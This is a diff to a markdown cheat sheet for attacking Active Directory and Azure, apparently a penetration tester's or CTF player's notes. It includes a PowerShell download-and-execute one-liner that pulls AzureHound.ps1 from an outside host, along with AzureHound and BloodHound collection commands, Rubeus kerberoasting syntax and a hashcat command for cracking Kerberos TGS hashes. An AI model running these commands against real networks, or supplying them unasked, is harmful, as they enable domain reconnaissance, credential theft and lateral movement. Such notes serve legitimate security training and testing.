@@ -39,7 +39,18 @@ For more details see: https://docs.microsoft.com/en-us/troubleshoot/windows-serv
 Actual collectors: https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 
 1. Get Sharphound on target host to collect data for Bloodhound
-`iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")`
+```
+iex(new-object net.webclient).downloadstring("http://10.10.14.43/AzureHound.ps1")
+
+Collecting your data set with AzureHound:
+
+PS C:\> Import-Module Az
+PS C:\> Import-Module AzureADPreview
+PS C:\> Connect-AzureAD
+PS C:\> Connect-AzAccount
+PS C:\> . .\AzureHound.ps1
+PS C:\> Invoke-AzureHound
+```
 
 2. Invoke Bloodhound on target host and harvest data
 `invoke-bloodhound -collectionmethod all -ZipFileName exf_blood -domain xxx.local -ldapuser xxxuserxxx -ldappass xxpasswordxxx`
@@ -78,7 +89,8 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 ```
 
-   1. Look for users via enum4linux
+   1. Look for users via enum4linux. Delete stuff after first space: 
+   cut -d ' ' -f 1 < users.txt  
       
    2. Use ASREP roast against users in the ldapenum_asrep_users.txt file
     
@@ -135,11 +147,14 @@ OR Rubeus
 
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 
+
+Rubeus.exe kerberoast </spn:user@domain.com | /spns:user1@domain.com,user2@domain.com> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]
+
 ```
 
 
 * And finally, crack the hash
-`hashcat -a -m 13100 SPN.hash /wordlists/rockyou.txt`
+`hashcat -a 0 -m 13100 --force SPN.hash /wordlists/rockyou.txt`
 
 ## Pass the Ticket
 
